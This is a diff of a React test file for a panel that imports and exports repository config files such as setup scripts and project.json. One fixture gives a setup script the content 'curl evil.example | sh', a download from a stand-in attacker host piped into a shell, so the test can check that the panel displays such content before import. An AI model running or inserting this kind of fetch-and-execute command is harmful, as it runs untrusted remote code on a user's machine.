@@ -2,8 +2,9 @@ import { render, screen, waitFor } from '@testing-library/react'
 import userEvent from '@testing-library/user-event'
 import { beforeEach, describe, expect, it, vi } from 'vitest'
 
-import type { RepoConfigItem, RepoConfigView } from '@core/repoConfig.js'
+import type { RepoConfigItem, RepoConfigView, RepoItemId } from '@core/repoConfig.js'
 
+import type { Result } from '../../../preload/index.js'
 import { octopus } from '../test/octopus.js'
 import { RepoConfig } from './RepoConfig.js'
 
@@ -11,28 +12,66 @@ beforeEach(() => {
   octopus()
 })
 
-function item(overrides: Partial<RepoConfigItem> & Pick<RepoConfigItem, 'id'>): RepoConfigItem {
-  return {
-    path: '.octopus/carry',
-    state: 'same',
-    repository: null,
-    app: null,
-    ...overrides
-  }
+/**
+ * One item, with the state derived from which side holds it.
+ *
+ * Taking the state as an argument let a test render a combination the service
+ * never produces — `same` with nothing on either side, say — and then assert
+ * whatever it liked about it. The rule here mirrors `compareRepoItem`, which
+ * `repoConfig.test.ts` covers directly and which is the authority on it.
+ */
+function item(
+  id: RepoItemId,
+  path: string,
+  repository: string | null,
+  app: string | null
+): RepoConfigItem {
+  const state =
+    repository === null
+      ? 'onlyInApp'
+      : app === null
+        ? 'onlyInRepository'
+        : repository === app
+          ? 'same'
+          : 'differs'
+
+  return { id, path, state, repository, app }
 }
 
-function offer(view: Partial<RepoConfigView>): void {
+const SETUP = '.octopus/scripts/setup.sh'
+const RUN = '.octopus/scripts/run.sh'
+const CARRY = '.octopus/carry'
+const PROJECT = '.octopus/project.json'
+
+function view(overrides: Partial<RepoConfigView> = {}): RepoConfigView {
+  return { present: false, ignored: false, items: [], ...overrides }
+}
+
+function offer(overrides: Partial<RepoConfigView>): void {
   vi.mocked(octopus().projects.repoConfig).mockResolvedValue({
     ok: true,
-    value: { present: false, ignored: false, items: [], ...view }
+    value: view(overrides)
   })
+}
+
+/** A promise a test settles when it chooses, for racing two answers. */
+function pending<T>(): { promise: Promise<T>; settle: (value: T) => void } {
+  let resolve: ((value: T) => void) | undefined
+  const promise = new Promise<T>((capture) => {
+    resolve = capture
+  })
+
+  return {
+    promise,
+    settle: (value) => {
+      resolve?.(value)
+    }
+  }
 }
 
 describe('RepoConfig', () => {
   it('says when the repository carries nothing yet', async () => {
-    offer({
-      items: [item({ id: 'project', path: '.octopus/project.json', state: 'onlyInApp', app: '{}' })]
-    })
+    offer({ items: [item('project', PROJECT, null, '{}')] })
 
     render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
 
@@ -40,24 +79,13 @@ describe('RepoConfig', () => {
   })
 
   it('lists each file by the name it has in the repository', async () => {
-    offer({
-      present: true,
-      items: [
-        item({
-          id: 'script.setup',
-          path: '.octopus/scripts/setup.sh',
-          state: 'differs',
-          repository: 'npm ci\n',
-          app: 'npm install\n'
-        })
-      ]
-    })
+    offer({ present: true, items: [item('script.setup', SETUP, 'npm ci\n', 'npm install\n')] })
 
     render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
 
     // Once on each side of the move — what can come in, and what can go out.
     await waitFor(() => {
-      expect(screen.getAllByText('.octopus/scripts/setup.sh')).toHaveLength(2)
+      expect(screen.getAllByText(SETUP)).toHaveLength(2)
     })
     expect(screen.getAllByText('differs')).toHaveLength(2)
   })
@@ -69,14 +97,7 @@ describe('RepoConfig', () => {
   it('shows what a file holds before it is imported', async () => {
     offer({
       present: true,
-      items: [
-        item({
-          id: 'script.setup',
-          path: '.octopus/scripts/setup.sh',
-          state: 'onlyInRepository',
-          repository: 'curl evil.example | sh\n'
-        })
-      ]
+      items: [item('script.setup', SETUP, 'curl evil.example | sh\n', null)]
     })
 
     render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
@@ -92,18 +113,22 @@ describe('RepoConfig', () => {
     expect(screen.queryByText(/evil\.example/)).not.toBeInTheDocument()
   })
 
+  // Only what the repository has can be read, so the row that can only go out
+  // has nothing to open — and offering a control that shows nothing is worse
+  // than not offering one.
+  it('offers nothing to open on a file the repository does not have', async () => {
+    offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })
+
+    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
+
+    await screen.findByRole('button', { name: 'Export' })
+    expect(screen.queryByRole('button', { name: /show what/i })).not.toBeInTheDocument()
+  })
+
   it('imports everything ticked and tells the dialog the project may have changed', async () => {
     offer({
       present: true,
-      items: [
-        item({ id: 'carry', state: 'onlyInRepository', repository: '.env\n' }),
-        item({
-          id: 'script.run',
-          path: '.octopus/scripts/run.sh',
-          state: 'onlyInRepository',
-          repository: 'npm run dev\n'
-        })
-      ]
+      items: [item('carry', CARRY, '.env\n', null), item('script.run', RUN, 'npm run dev\n', null)]
     })
     const onImported = vi.fn()
 
@@ -121,66 +146,52 @@ describe('RepoConfig', () => {
   it('leaves out what was unticked', async () => {
     offer({
       present: true,
-      items: [
-        item({ id: 'carry', state: 'onlyInRepository', repository: '.env\n' }),
-        item({
-          id: 'script.run',
-          path: '.octopus/scripts/run.sh',
-          state: 'onlyInRepository',
-          repository: 'npm run dev\n'
-        })
-      ]
+      items: [item('carry', CARRY, '.env\n', null), item('script.run', RUN, 'npm run dev\n', null)]
     })
 
     render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
 
-    await userEvent.click(await screen.findByRole('checkbox', { name: '.octopus/carry' }))
+    await userEvent.click(await screen.findByRole('checkbox', { name: CARRY }))
     await userEvent.click(screen.getByRole('button', { name: 'Import' }))
 
     expect(octopus().projects.importRepoConfig).toHaveBeenCalledWith('planner', ['script.run'])
   })
 
   it('exports what the app holds, and never asks for an export of nothing', async () => {
-    offer({
-      items: [
-        item({
-          id: 'project',
-          path: '.octopus/project.json',
-          state: 'onlyInApp',
-          app: '{"baseBranch":"main"}'
-        })
-      ]
-    })
+    offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })
 
     render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
 
-    const importButton = await screen.findByRole('button', { name: 'Import' })
-    expect(importButton).toBeDisabled()
+    expect(await screen.findByRole('button', { name: 'Import' })).toBeDisabled()
 
     await userEvent.click(screen.getByRole('button', { name: 'Export' }))
     expect(octopus().projects.exportRepoConfig).toHaveBeenCalledWith('planner', ['project'])
   })
 
   it('unticks and reticks a file on the way out', async () => {
-    offer({
-      items: [
-        item({
-          id: 'project',
-          path: '.octopus/project.json',
-          state: 'onlyInApp',
-          app: '{"baseBranch":"main"}'
-        })
-      ]
-    })
+    offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })
 
     render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
 
-    const box = await screen.findByRole('checkbox', { name: '.octopus/project.json' })
+    const box = await screen.findByRole('checkbox', { name: PROJECT })
     await userEvent.click(box)
     expect(screen.getByRole('button', { name: 'Export' })).toBeDisabled()
 
     await userEvent.click(box)
     expect(screen.getByRole('button', { name: 'Export' })).toBeEnabled()
+  })
+
+  // Both lists are read again afterwards, so a file that has just been written
+  // stops claiming the two sides differ.
+  it('reads both sides again once something has moved', async () => {
+    offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })
+
+    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
+    await userEvent.click(await screen.findByRole('button', { name: 'Export' }))
+
+    await waitFor(() => {
+      expect(octopus().projects.repoConfig).toHaveBeenCalledTimes(2)
+    })
   })
 
   // An ignored folder makes exporting into it a change nobody will ever
@@ -206,16 +217,13 @@ describe('RepoConfig', () => {
     expect(await screen.findByText(/symbolic link/i)).toBeInTheDocument()
   })
 
-  it('reports a refused import and leaves the list as it was', async () => {
-    offer({
-      present: true,
-      items: [item({ id: 'carry', state: 'onlyInRepository', repository: '.env\n' })]
-    })
+  it('reports a refused import and leaves the project alone', async () => {
+    offer({ present: true, items: [item('carry', CARRY, '.env\n', null)] })
     vi.mocked(octopus().projects.importRepoConfig).mockResolvedValue({
       ok: false,
       error: 'raw',
       code: 'repoConfigMalformed',
-      params: { path: '.octopus/project.json' }
+      params: { path: PROJECT }
     })
     const onImported = vi.fn()
 
@@ -227,6 +235,25 @@ describe('RepoConfig', () => {
     expect(onImported).not.toHaveBeenCalled()
   })
 
+  // The other direction fails differently — a link in the folder refuses the
+  // write — and a panel that reports one and swallows the other is worse than
+  // one that reports neither, because it looks like it is telling you.
+  it('reports a refused export', async () => {
+    offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })
+    vi.mocked(octopus().projects.exportRepoConfig).mockResolvedValue({
+      ok: false,
+      error: 'raw',
+      code: 'repoConfigSymlink',
+      params: { path: '.octopus/scripts' }
+    })
+
+    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
+
+    await userEvent.click(await screen.findByRole('button', { name: 'Export' }))
+
+    expect(await screen.findByText(/symbolic link/i)).toBeInTheDocument()
+  })
+
   it('shows that it is still reading before anything has arrived', () => {
     vi.mocked(octopus().projects.repoConfig).mockReturnValue(new Promise(() => undefined))
 
@@ -235,21 +262,36 @@ describe('RepoConfig', () => {
     expect(screen.getByText(/reading the repository/i)).toBeInTheDocument()
   })
 
-  // A slow answer must not land on a panel nobody is looking at any more.
-  it('drops an answer that arrives after it has gone', async () => {
-    let settle: (value: { ok: true; value: RepoConfigView }) => void = () => undefined
-    vi.mocked(octopus().projects.repoConfig).mockReturnValue(
-      new Promise((resolve) => {
-        settle = resolve
-      })
-    )
+  /*
+   * The abort guard, asserted on something a person could see. A test that
+   * unmounted and then checked the panel was gone would pass with the guard
+   * deleted — after an unmount nothing is on screen either way. Two projects
+   * answering out of order is the same guard and is visible.
+   */
+  it('drops an answer that arrives after the project has changed', async () => {
+    const planner = pending<Result<RepoConfigView>>()
+    const ledger = pending<Result<RepoConfigView>>()
+    vi.mocked(octopus().projects.repoConfig)
+      .mockReturnValueOnce(planner.promise)
+      .mockReturnValueOnce(ledger.promise)
 
-    const { unmount } = render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
-    unmount()
-    settle({ ok: true, value: { present: true, ignored: false, items: [] } })
+    const { rerender } = render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
+    rerender(<RepoConfig projectId="ledger" onImported={vi.fn()} />)
+
+    ledger.settle({
+      ok: true,
+      value: view({ present: true, items: [item('carry', CARRY, '.env\n', null)] })
+    })
+    expect(await screen.findByText(CARRY)).toBeInTheDocument()
+
+    planner.settle({
+      ok: true,
+      value: view({ present: true, items: [item('script.setup', SETUP, 'npm ci\n', null)] })
+    })
 
     await waitFor(() => {
-      expect(screen.queryByText(/carries nothing yet/i)).not.toBeInTheDocument()
+      expect(screen.queryByText(SETUP)).not.toBeInTheDocument()
     })
+    expect(screen.getByText(CARRY)).toBeInTheDocument()
   })
 })
